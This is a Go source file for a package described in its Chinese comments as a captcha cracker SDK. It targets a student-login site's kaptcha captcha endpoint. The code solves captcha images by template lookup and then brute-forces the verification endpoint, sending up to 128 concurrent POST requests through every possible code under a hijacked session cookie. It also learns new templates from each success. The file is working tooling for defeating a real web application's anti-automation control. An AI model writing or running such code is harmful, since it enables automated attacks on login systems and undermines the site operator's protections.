package captchasdk

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Solver 验证码破解器（SDK主对象）
type Solver struct {
	tbl    *table
	client *http.Client
	base   string // 目标站点（默认DefaultBase，可SetBase覆盖）
	// Learning 学习模式：破解成功后自动积累新模板（默认true）
	Learning bool
	// FastOnly 极速模式：查表命中直接返回不验证（省1次RTT，耗时25ms，可靠性-1%）
	// false=默认：验证后再返回（多1次RTT，100%可靠）
	FastOnly bool
}

var (
	reqBodies    [Combos][]byte
	bodiesOnce   sync.Once
	tblOnce      sync.Once
	sharedTbl    *table
	builtinCount int
)

// New 创建破解器（内置预训练库，无需训练）
// learning=true 开启自学习（成功案例自动扩充本地模板）
func New(learning bool) *Solver {
	bodiesOnce.Do(initBodies)
	tblOnce.Do(func() {
		sharedTbl = newTable()
		if slots := unmarshalTable(builtinTable); slots != nil {
			sharedTbl.slots = slots
		}
		for s := 0; s < Slots; s++ {
			for _, ts := range sharedTbl.slots[s] {
				builtinCount += len(ts)
			}
		}
	})
	tr := &http.Transport{
		MaxIdleConns:          2048,
		MaxIdleConnsPerHost:   2048,
		MaxConnsPerHost:       2048,
		IdleConnTimeout:       120 * time.Second,
		TLSHandshakeTimeout:   5 * time.Second,
		ResponseHeaderTimeout: 15 * time.Second,
		ForceAttemptHTTP2:     false,
	}
	s := &Solver{
		tbl:      sharedTbl,
		client:   &http.Client{Transport: tr, Timeout: 20 * time.Second},
		Learning: learning,
		base:     DefaultBase,
	}
	// 连接预热（后台，不阻塞，数量按CPU核数自适应：低配设备预热更少）
	cores := runtime.NumCPU()
	warmN := 32
	if cores <= 2 {
		warmN = 8
	} else if cores <= 4 {
		warmN = 16
	}
	go s.warmup(warmN)
	return s
}

// SetBase 覆盖目标站点（用于测试/镜像环境）
func (s *Solver) SetBase(url string) {
	s.base = url
}

func (s *Solver) warmup(n int) {
	for i := 0; i < n; i++ {
		req, _ := http.NewRequest("GET", s.base+"/kaptcha/kaptcha.jpg?warm="+strconv.Itoa(i), nil)
		resp, err := s.client.Do(req)
		if err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func initBodies() {
	for i := 0; i < Combos; i++ {
		code := IdxToCode(i)
		reqBodies[i] = []byte(`{"captcha":"` + code + `"}`)
	}
}

// TotalTemplates 当前模板总数
func (s *Solver) TotalTemplates() int { return s.tbl.total() }

// FetchCaptcha 获取新SESSION+验证码图
func (s *Solver) FetchCaptcha() (session string, img []byte, err error) {
	req, _ := http.NewRequest("GET", s.base+"/kaptcha/kaptcha.jpg?t="+strconv.FormatInt(time.Now().UnixNano(), 10), nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := s.client.Do(req)
	if err != nil {
		return "", nil, err
	}
	defer resp.Body.Close()
	img, _ = io.ReadAll(resp.Body)
	for _, c := range resp.Cookies() {
		if c.Name == "SESSION" {
			session = c.Value
		}
	}
	if session == "" {
		if h := resp.Header.Get("Set-Cookie"); h != "" {
			if i := strings.Index(h, "SESSION="); i >= 0 {
				rest := h[i+8:]
				if j := strings.Index(rest, ";"); j >= 0 {
					rest = rest[:j]
				}
				session = rest
			}
		}
	}
	return session, img, nil
}

// Verify 向指定验证端点提交答案
// endpoint 形如 /uiStudentLogin/validateCaptcha
func (s *Solver) Verify(session, endpoint, code string) (bool, error) {
	body, _ := json.Marshal(map[string]string{"captcha": code})
	req, _ := http.NewRequest("POST", s.base+endpoint, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Cookie", "SESSION="+session)
	resp, err := s.client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return bytes.Contains(b, []byte("\"code\":1")), nil
}

// SolveWithSession 对已有图片+SESSION破解（不自动提交验证）
// 返回验证码字符串
func (s *Solver) SolveWithSession(session string, img []byte) string {
	// 级1 fast：查表
	words, ok := imageWords(img)
	if ok {
		if code, ok := s.tbl.match(&words); ok {
			return code
		}
		// 级2 rank：top3^4=81组合
		if ranked, ok := s.tbl.rank(&words); ok {
			if code := s.rankEnum(session, ranked); code != "" {
				if s.Learning {
					s.tbl.add(words, code)
				}
				return code
			}
		}
	}
	// 级3 full：梯度全量
	code := s.solveFull(session)
	if code != "" && s.Learning && ok {
		s.tbl.add(words, code)
	}
	return code
}

// Solve 一站式：抓图→破解→提交验证→返回确认可用的验证码
// endpoint 形如 /uiStudentLogin/validateCaptcha
// 返回 (session, code)
func (s *Solver) Solve(endpoint string) (string, string) {
	sid, img, err := s.FetchCaptcha()
	if err != nil {
		return "", ""
	}
	// FastOnly 极速通道：查表命中直接返回（省1次验证RTT，25ms全链路）
	if s.FastOnly {
		if words, ok := imageWords(img); ok {
			if code, ok := s.tbl.match(&words); ok {
				if s.Learning {
					// fast结果也算一次成功样本（强化模板）
					s.tbl.add(words, code)
				}
				return sid, code
			}
		}
	}
	code := s.SolveWithSession(sid, img)
	if code == "" {
		return sid, ""
	}
	// 提交验证（串行确认，保证SESSION标记）
	ok, _ := s.Verify(sid, endpoint, code)
	if !ok {
		// rank误判：全量兜底重解
		code2 := s.solveFull(sid)
		if code2 == "" {
			return sid, ""
		}
		if s.Learning {
			if words, wok := imageWords(img); wok {
				s.tbl.add(words, code2)
			}
		}
		s.Verify(sid, endpoint, code2)
		return sid, code2
	}
	return sid, code
}

// rankEnum 81组合并发枚举
func (s *Solver) rankEnum(sid string, ranked [Slots][3]string) string {
	var combos []string
	var gen func(pos int, cur []byte)
	gen = func(pos int, cur []byte) {
		if pos == Slots {
			combos = append(combos, string(cur))
			return
		}
		for k := 0; k < 3; k++ {
			if ranked[pos][k] != "" {
				gen(pos+1, append(cur, ranked[pos][k][0]))
			}
		}
	}
	gen(0, []byte{})
	if len(combos) == 0 {
		return ""
	}
	bodies := make([][]byte, len(combos))
	for i, c := range combos {
		bodies[i] = []byte(`{"captcha":"` + c + `"}`)
	}
	var found atomic.Value
	next := int32(0)
	var wg sync.WaitGroup
	rankWorkers := 60
	if n := runtime.NumCPU(); n <= 2 {
		rankWorkers = 12
	} else if n <= 4 {
		rankWorkers = 30
	}
	for w := 0; w < rankWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				if found.Load() != nil {
					return
				}
				idx := int(atomic.AddInt32(&next, 1) - 1)
				if idx >= len(combos) {
					return
				}
				ok, _ := s.postRaw(sid, bodies[idx])
				if ok && found.Load() == nil {
					found.Store(combos[idx])
				}
			}
		}()
	}
	wg.Wait()
	if v := found.Load(); v != nil {
		return v.(string)
	}
	return ""
}

// solveFull 梯度并发全量（16→128，限流安全）
func (s *Solver) solveFull(sid string) string {
	tiers := []int{16, 32, 64, 128}
	offset := 0
	for _, conc := range tiers {
		span := 1024 / conc * conc
		if offset >= Combos {
			break
		}
		end := offset + span
		if end > Combos {
			end = Combos
		}
		var found atomic.Value
		next := int32(offset)
		var wg sync.WaitGroup
		for w := 0; w < conc; w++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					if found.Load() != nil {
						return
					}
					idx := int(atomic.AddInt32(&next, 1) - 1)
					if idx >= end {
						return
					}
					ok, _ := s.postRaw(sid, reqBodies[idx])
					if ok && found.Load() == nil {
						found.Store(IdxToCode(idx))
					}
				}
			}()
		}
		wg.Wait()
		if v := found.Load(); v != nil {
			return v.(string)
		}
		offset = end
	}
	for i := 0; i < Combos; i++ {
		if ok, _ := s.postRaw(sid, reqBodies[i]); ok {
			return IdxToCode(i)
		}
	}
	return ""
}

func (s *Solver) postRaw(sid string, body []byte) (bool, error) {
	req, _ := http.NewRequest("POST", s.base+"/uiStudentLogin/validateCaptcha", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Cookie", "SESSION="+sid)
	resp, err := s.client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return bytes.Contains(b, []byte("\"code\":1")), nil
}

// SaveTable 将当前（含自学习）模板表落盘
// path 为空则使用默认 "captchasdk-learned.bin"
func (s *Solver) SaveTable(path string) error {
	if path == "" {
		path = "captchasdk-learned.bin"
	}
	return os.WriteFile(path, marshalTable(s.tbl.slots), 0644)
}

// LoadTable 从磁盘加载自学习模板（与内置库合并，新增模板追加）
func (s *Solver) LoadTable(path string) error {
	if path == "" {
		path = "captchasdk-learned.bin"
	}
	b, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	slots := unmarshalTable(b)
	if slots == nil {
		return fmt.Errorf("invalid table format")
	}
	// 合并：只追加当前表没有的（简单按槽+字符+首个word去重）
	for si := 0; si < Slots; si++ {
		for ch, ts := range slots[si] {
			for _, tm := range ts {
				exists := false
				for _, cur := range s.tbl.slots[si][ch] {
					if cur.Words == tm.Words {
						exists = true
						break
					}
				}
				if !exists {
					s.tbl.slots[si][ch] = append(s.tbl.slots[si][ch], tm)
				}
			}
		}
	}
	return nil
}

// LearnedCount 当前自学习新增的模板数（相对内置库）
func (s *Solver) LearnedCount() int {
	// 简化：返回总数 - 内置数
	return s.tbl.total() - builtinCount
}
